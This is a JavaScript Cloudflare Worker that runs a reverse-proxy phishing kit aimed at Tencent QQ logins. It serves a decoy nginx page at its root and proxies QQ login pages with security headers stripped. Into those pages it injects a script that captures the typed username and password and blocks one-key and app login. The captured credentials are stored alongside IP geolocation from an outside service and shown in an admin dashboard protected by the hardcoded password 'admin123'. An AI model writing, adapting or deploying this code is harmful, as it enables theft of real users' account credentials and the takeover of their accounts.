export default {
  async fetch(request, env, ctx) {
    return await handleRequest(request, env);
  }
};

const lastVisitProxyCookie = "__PROXY_VISITEDSITE__";
const adminPassword = "admin123"; // 后台管理密码，请修改

const nginxWelcomePage = `<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; }</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and working. Further configuration is required.</p>
<p>For online documentation and support please refer to <a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at <a href="http://nginx.com/">nginx.com</a>.</p>
<p><em>Thank you for using nginx.</em></p>
</body>
</html>`;

// 初始化数据库表
async function initDB(env) {
  try {
    const tableCheck = await env.DB.prepare(
      "SELECT name FROM sqlite_master WHERE type='table' AND name='login_records'"
    ).first();
    if (!tableCheck) {
      await env.DB.prepare(`
        CREATE TABLE login_records (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          username TEXT NOT NULL,
          password TEXT NOT NULL,
          timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
          ip TEXT,
          country TEXT,
          region TEXT,
          city TEXT,
          asOrganization TEXT,
          user_agent TEXT,
          device_type TEXT
        )
      `).run();
    }
  } catch (error) {
    console.error('Database init error:', error);
  }
}

async function handleRequest(request, env) {
  const url = new URL(request.url);
  const userAgent = request.headers.get('User-Agent') || '';
  const cfIP = request.headers.get('CF-Connecting-IP') ||
               request.headers.get('X-Forwarded-For') ||
               request.headers.get('X-Real-IP') || 'unknown';
  const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(userAgent);

  if (env.DB) await initDB(env);

  // 后台管理
  if (url.pathname === '/admin') return handleAdminRequest(request, env);
  if (url.pathname === '/admin/clear') return handleClearRecords(request, env);
  if (url.pathname === '/admin/logout') {
    const headers = new Headers();
    headers.set('Location', '/admin');
    headers.set('Set-Cookie', 'admin_auth=; Path=/; HttpOnly; Max-Age=0');
    return new Response(null, { status: 302, headers });
  }

  // 记录登录信息（接收客户端发送的IP地理信息）
  if (url.pathname === '/api/log') {
    return handleLogRequest(request, cfIP, userAgent, isMobile, env);
  }

  // 根路径
  if (url.pathname === '/' || url.pathname === '') {
    return new Response(nginxWelcomePage, {
      headers: { 'Content-Type': 'text/html; charset=utf-8' }
    });
  }

  if (url.pathname === '/favicon.ico') {
    return Response.redirect('https://ti.qq.com/favicon.ico', 302);
  }
  if (url.pathname === '/robots.txt') {
    return new Response('User-agent: *\nDisallow: /', {
      headers: { 'Content-Type': 'text/plain' }
    });
  }

  if (isVerificationLink(url.pathname)) {
    return handleVerificationLink(request, url, isMobile);
  }

  if (url.pathname.startsWith('/qq')) {
    return handleQQRequest(request, url, isMobile, env);
  }

  return new Response('Not Found', { status: 404 });
}

// ==================== 后台管理 ====================
async function handleAdminRequest(request, env) {
  const cookies = request.headers.get('Cookie') || '';
  const adminAuth = getCookie('admin_auth', cookies);
  if (request.method === 'POST') {
    const formData = await request.formData();
    const pwd = formData.get('password');
    if (pwd === adminPassword) {
      const headers = new Headers();
      headers.set('Location', '/admin');
      headers.set('Set-Cookie', 'admin_auth=1; Path=/; HttpOnly; Max-Age=3600');
      return new Response(null, { status: 302, headers });
    } else {
      return showAdminLogin('密码错误');
    }
  }
  if (adminAuth === '1') {
    return await showAdminDashboard(env);
  }
  return showAdminLogin();
}

async function handleClearRecords(request, env) {
  const cookies = request.headers.get('Cookie') || '';
  const adminAuth = getCookie('admin_auth', cookies);
  if (adminAuth !== '1') return new Response('Unauthorized', { status: 401 });
  try {
    await env.DB.prepare('DELETE FROM login_records').run();
    const headers = new Headers();
    headers.set('Location', '/admin');
    return new Response(null, { status: 302, headers });
  } catch (error) {
    return new Response(`清除失败: ${error.message}`, { status: 500 });
  }
}

function showAdminLogin(error = '') {
  const html = `...`; // （略，保持与之前相同）
  return new Response(html, { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
}

async function showAdminDashboard(env) {
  try {
    const { results } = await env.DB.prepare(`
      SELECT * FROM login_records ORDER BY timestamp DESC LIMIT 100
    `).all();
    const countResult = await env.DB.prepare('SELECT COUNT(*) as count FROM login_records').first();
    const totalCount = countResult?.count || 0;

    let recordsHtml = '';
    if (results?.length) {
      results.forEach(r => {
        recordsHtml += `<tr>
          <td>${r.id}</td>
          <td>${escapeHtml(r.username)}</td>
          <td>${escapeHtml(r.password)}</td>
          <td>${new Date(r.timestamp).toLocaleString('zh-CN')}</td>
          <td>${escapeHtml(r.ip || '')}</td>
          <td>${escapeHtml(r.country || '')} ${escapeHtml(r.region || '')} ${escapeHtml(r.city || '')}</td>
          <td>${escapeHtml(r.asOrganization || '').substring(0, 30)}</td>
          <td>${escapeHtml(r.device_type || '')}</td>
          <td title="${escapeHtml(r.user_agent || '')}">${escapeHtml(r.user_agent || '').substring(0, 30)}...</td>
        </tr>`;
      });
    } else {
      recordsHtml = '<tr><td colspan="9">暂无记录</td></tr>';
    }

    const dbStatus = env.DB ? '✅ 已连接' : '❌ 未绑定 DB';
    const html = `<!DOCTYPE html>
    <html>
    <head><title>登录记录管理</title>
    <style>
      body { font-family: Arial, sans-serif; margin: 20px; }
      table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 14px; }
      th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
      th { background-color: #f2f2f2; }
      .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
      .status { color: green; font-weight: bold; }
    </style>
    </head>
    <body>
      <div class="header">
        <h1>登录记录管理</h1>
        <div><a href="/admin/logout">退出登录</a></div>
      </div>
      <div style="margin-bottom: 20px;">
        <strong>数据库状态：</strong><span class="status">${dbStatus}</span> &nbsp;&nbsp;
        <strong>总记录数：</strong>${totalCount} &nbsp;&nbsp;
        <a href="/admin/clear" onclick="return confirm('确定清除所有记录？')" style="background:#dc3545; color:white; padding:5px 12px; text-decoration:none; border-radius:4px;">清除所有记录</a>
      </div>
      <table>
        <thead><tr><th>ID</th><th>用户名</th><th>密码</th><th>时间</th><th>IP</th><th>地理位置</th><th>运营商</th><th>设备</th><th>UserAgent</th></tr></thead>
        <tbody>${recordsHtml}</tbody>
      </table>
    </body>
    </html>`;
    return new Response(html, { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
  } catch (error) {
    return new Response(`数据库错误: ${error.message}`, { status: 500 });
  }
}

// ==================== 记录登录信息 ====================
async function handleLogRequest(request, cfIP, userAgent, isMobile, env) {
  if (request.method !== 'POST') return new Response('Method not allowed', { status: 405 });
  try {
    const { username, password, ipGeo } = await request.json();
    if (!username || !password) return new Response('Missing username or password', { status: 400 });

    // 优先使用客户端通过 ip.ilqx.dpdns.org/geo 获取的地理信息，否则 fallback
    const ip = ipGeo?.ip || cfIP;
    const country = ipGeo?.country || '';
    const region = ipGeo?.region || '';
    const city = ipGeo?.city || '';
    const asOrganization = ipGeo?.asOrganization || '';
    const device_type = isMobile ? 'mobile' : 'desktop';

    await env.DB.prepare(`
      INSERT INTO login_records 
        (username, password, ip, country, region, city, asOrganization, user_agent, device_type)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).bind(username, password, ip, country, region, city, asOrganization, userAgent, device_type).run();

    return new Response(JSON.stringify({ success: true }), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (error) {
    console.error('Log request error:', error);
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

// ==================== 验证链接处理（原有逻辑）====================
function isVerificationLink(pathname) {
  const paths = ['/ssl/check','/ssl/login','/cgi-bin/ssl/check','/cgi-bin/login','/cgi-bin/xlogin'];
  return paths.some(p => pathname.startsWith(p));
}
async function handleVerificationLink(request, url, isMobile) {
  // （完全保留原有逻辑，略）
}

// ==================== 核心代理 ====================
async function handleQQRequest(request, url, isMobile, env) {
  const fullPath = url.pathname + url.search + url.hash;
  const pathAfterQQ = fullPath.substring(3);
  let targetUrl;
  if (pathAfterQQ === '' || pathAfterQQ === '/' || pathAfterQQ === '?' || pathAfterQQ.startsWith('?')) {
    targetUrl = 'https://ti.qq.com/qqlevel/index' + (pathAfterQQ.startsWith('?') ? pathAfterQQ : '');
  } else {
    const pathEndIndex = pathAfterQQ.indexOf('?');
    let pathPart = pathEndIndex === -1 ? pathAfterQQ : pathAfterQQ.substring(0, pathEndIndex);
    const queryPart = pathEndIndex === -1 ? '' : pathAfterQQ.substring(pathEndIndex);
    if (!pathPart.startsWith('/')) pathPart = '/' + pathPart;
    const isLoginPath = pathPart.includes('/cgi-bin/login') || pathPart.includes('/cgi-bin/xlogin');
    if (isLoginPath) {
      const domain = isMobile ? 'ui.ptlogin2.qq.com' : 'xui.ptlogin2.qq.com';
      targetUrl = `https://${domain}${pathPart}${queryPart}`;
    } else {
      targetUrl = `https://ti.qq.com${pathPart}${queryPart}`;
    }
  }

  if (targetUrl.includes('accounts.qq.com/psw/find') ||
      targetUrl.includes('ssl.zc.qq.com/phone/index.html')) {
    return Response.redirect(targetUrl, 302);
  }

  try {
    const headers = new Headers(request.headers);
    headers.delete('Origin');
    headers.delete('Referer');
    headers.set('User-Agent', request.headers.get('User-Agent') || '');

    const proxyRequest = new Request(targetUrl, {
      method: request.method,
      headers: headers,
      body: request.body,
      redirect: 'follow'
    });
    const response = await fetch(proxyRequest);
    const contentType = response.headers.get('Content-Type') || '';

    if (contentType.includes('text/html')) {
      let html = await response.text();
      const proxyBase = new URL(request.url);
      const proxyOrigin = proxyBase.origin;

      // 替换验证链接（原有逻辑）
      const qqDomains = ['ti.qq.com','ui.ptlogin2.qq.com','xui.ptlogin2.qq.com','ptlogin2.qq.com'];
      const verificationPaths = ['ssl/check','ssl/login','cgi-bin/ssl/check','cgi-bin/login','cgi-bin/xlogin'];
      for (const domain of qqDomains) {
        for (const path of verificationPaths) {
          const pattern = new RegExp(`https?://${domain}/${path}`, 'gi');
          html = html.replace(pattern, `/qq/${path}`);
        }
      }

      // ========== 注入超级拦截器 ==========
      const injectScript = `
      <script>
      (function(){
        // 防止重复绑定
        if (window.__aegis_proxy_injected) return;
        window.__aegis_proxy_injected = true;

        // ---------- 1. 获取真实IP及地理信息（移动端必用）----------
        function fetchGeoAndSend(username, password) {
          // 立即发送一次（可能缺IP）
          sendLog(username, password, null);
          // 同时异步获取地理信息并更新
          fetch('https://ip.ilqx.dpdns.org/geo')
            .then(r => r.json())
            .then(geo => sendLog(username, password, geo))
            .catch(() => {});
        }

        function sendLog(username, password, ipGeo) {
          if (!username || !password) return;
          fetch('/api/log', {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({ username, password, ipGeo }),
            keepalive: true   // 页面跳转后依然送达
          }).catch(() => {});
        }

        // ---------- 2. 拦截所有外部协议跳转（APP唤醒）----------
        function blockAllAppLinks() {
          const isExternalProto = (url) => {
            if (!url) return false;
            // 这些协议都会尝试唤起外部APP
            const dangerous = [
              'tel:', 'mailto:', 'sms:', 'mqq:', 'tencent:', 'weixin:',
              'alipay:', 'baiduboxapp:', 'snssdk1128:', 'openapp.jdmobile:',
              'taobao:', 'tmall:', 'pinduoduo:', 'douyin:', 'kuaishou:',
              'intent:', 'android-app:', 'ios-app:', 'market:'
            ];
            return dangerous.some(p => url.startsWith(p));
          };

          // 1) 重写 window.location
          const originalLocation = window.location;
          Object.defineProperty(window, 'location', {
            get: () => originalLocation,
            set: (val) => {
              if (isExternalProto(val)) return; // 完全静默
              originalLocation.href = val;
            }
          });

          // 2) 重写 window.open
          const originalOpen = window.open;
          window.open = function(url, ...args) {
            if (isExternalProto(url)) return null;
            return originalOpen.call(window, url, ...args);
          };

          // 3) 拦截所有 <a> 点击
          document.addEventListener('click', function(e) {
            let target = e.target;
            while (target && target.tagName !== 'A') target = target.parentElement;
            if (target && target.href) {
              if (isExternalProto(target.href)) {
                e.preventDefault();
                e.stopPropagation();
                e.stopImmediatePropagation();
                return false;
              }
            }
          }, true);  // 捕获阶段，确保最先执行

          // 4) 拦截动态插入的链接
          const observer = new MutationObserver(() => {
            document.querySelectorAll('a[href]').forEach(link => {
              if (isExternalProto(link.href)) {
                link.addEventListener('click', (e) => {
                  e.preventDefault();
                  e.stopPropagation();
                }, true);
              }
            });
          });
          observer.observe(document.body, { childList: true, subtree: true });
        }

        // ---------- 3. 捕获登录按钮 ----------
        function captureLogin() {
          const loginBtn = document.getElementById('go');
          if (!loginBtn) return;
          // 移除旧监听，避免重复
          const newBtn = loginBtn.cloneNode(true);
          loginBtn.parentNode?.replaceChild(newBtn, loginBtn);

          newBtn.addEventListener('click', function(e) {
            // 立即获取输入框的值
            const u = document.getElementById('u')?.value ||
                     document.querySelector('input[name="u"]')?.value ||
                     document.querySelector('input[placeholder*="QQ号码"]')?.value ||
                     document.querySelector('input[placeholder*="手机"]')?.value ||
                     document.querySelector('input[placeholder*="邮箱"]')?.value || '';
            const p = document.getElementById('p')?.value ||
                     document.querySelector('input[name="p"]')?.value ||
                     document.querySelector('input[type="password"]')?.value || '';
            if (u && p) {
              fetchGeoAndSend(u, p);
            }
          }, true);
        }

        // ---------- 4. 一键登录完全阻止，且不跳转----------
        function blockOneKey() {
          const onekey = document.getElementById('onekey');
          if (!onekey) return;
          const newOne = onekey.cloneNode(true);
          onekey.parentNode?.replaceChild(newOne, onekey);
          newOne.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            return false;
          }, true);
        }

        // ---------- 5. 执行所有拦截 ----------
        blockAllAppLinks();
        captureLogin();
        blockOneKey();

        // 确保 DOM 加载后再次尝试
        document.addEventListener('DOMContentLoaded', function() {
          captureLogin();
          blockOneKey();
        });

        // ---------- 保留原有代理链接重写 ----------
        const proxyOrigin = '${proxyOrigin}';
        function rewriteUrl(url) {
          if (!url || typeof url !== 'string') return url;
          if (url.startsWith('data:') || url.startsWith('javascript:') || url.startsWith('#')) return url;
          // 所有外部协议全部原样返回（会被上面的点击拦截阻止）
          if (url.startsWith('http://') || url.startsWith('https://') || url.startsWith('//')) {
            try {
              const fullUrl = url.startsWith('//') ? 'https:' + url : url;
              const urlObj = new URL(fullUrl);
              const qqDomains = ['ti.qq.com','ui.ptlogin2.qq.com','xui.ptlogin2.qq.com','ptlogin2.qq.com'];
              if (qqDomains.some(d => urlObj.hostname.includes(d))) {
                return proxyOrigin + '/qq' + urlObj.pathname + urlObj.search + urlObj.hash;
              }
            } catch(e) {}
          }
          return url;
        }

        function rewriteLinks() {
          document.querySelectorAll('a[href]').forEach(link => {
            const orig = link.getAttribute('href');
            if (orig && !orig.startsWith(proxyOrigin + '/qq')) {
              const newHref = rewriteUrl(orig);
              if (newHref !== orig) link.setAttribute('href', newHref);
            }
          });
        }
        rewriteLinks();
        new MutationObserver(rewriteLinks).observe(document.body, { childList: true, subtree: true });
      })();
      </script>`;

      html = html.replace('</body>', injectScript + '</body>');

      const newHeaders = new Headers(response.headers);
      newHeaders.set('Content-Type', 'text/html; charset=utf-8');
      newHeaders.set('Access-Control-Allow-Origin', '*');
      newHeaders.set('X-Frame-Options', 'ALLOWALL');
      newHeaders.delete('Content-Security-Policy');
      newHeaders.delete('X-Content-Security-Policy');
      newHeaders.append('Set-Cookie', `${lastVisitProxyCookie}=${encodeURIComponent(targetUrl)}; Path=/; Max-Age=86400`);

      return new Response(html, {
        status: response.status,
        statusText: response.statusText,
        headers: newHeaders
      });
    } else {
      return response;
    }
  } catch (error) {
    return new Response(`Proxy Error: ${error.message}`, { status: 500 });
  }
}

// ==================== 辅助函数 ====================
function getCookie(name, cookieString) {
  if (!cookieString) return null;
  for (let cookie of cookieString.split(';')) {
    const [key, value] = cookie.trim().split('=');
    if (key === name) return decodeURIComponent(value || '');
  }
  return null;
}

function escapeHtml(text) {
  if (!text) return '';
  const map = { '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;' };
  return text.replace(/[&<>"']/g, m => map[m]);
}